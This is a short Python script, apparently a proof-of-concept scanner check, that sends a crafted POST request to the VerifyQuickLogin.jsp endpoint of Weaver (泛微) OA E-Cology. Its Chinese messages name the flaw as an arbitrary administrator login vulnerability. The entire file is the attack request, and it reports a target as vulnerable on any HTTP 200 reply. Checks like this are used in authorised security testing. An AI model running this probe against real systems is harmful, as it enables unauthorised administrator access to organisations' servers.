import re
import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
   
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36", 
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,imge/avif,imge/webp,imge/apng,*/*;q=0.8,application/signed-exchange;v=63;q=0.9",
        "Accept-Encoding":"gzip,deflate",
        }
    data='identifier=1&language=1&ipaddress=x.x.x.x'
    vuln_url=target_url+"mobile/plugin/VerifyQuickLogin.jsp"
    success_msg = now_time() + '[SUCCESS]检测到存在此漏洞'
    shell_msg = now_time() + ':{}'.format(vuln_url)
    warning_msg = now_time() + '[WARNING]泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞不存在'
    error_msg = now_time() + '[泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.post(vuln_url, headers=headers, data=data, verify=False)
        if url.status_code== 200:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
 
